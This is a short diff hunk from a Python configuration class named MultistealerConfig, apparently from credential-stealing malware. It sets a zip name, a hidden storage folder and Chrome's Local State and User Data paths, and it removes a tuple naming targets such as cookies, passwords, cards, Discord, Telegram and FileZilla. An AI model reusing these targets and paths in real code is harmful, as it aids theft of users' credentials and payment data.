@@ -30,8 +30,6 @@ class MultistealerConfig:
     ZipName = f"{user}-st"
     StoragePath = rf"{user_profile}\AppData\stink"
 
-    Functions = ("system", "screen", "cookies", "passwords", "history", "bookmarks", "processes", "cards", "discord", "telegram", "filezilla")
-
     ChromePaths = (
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data\Local State",
         rf"{user_profile}\AppData\Local\Google\Chrome\User Data",
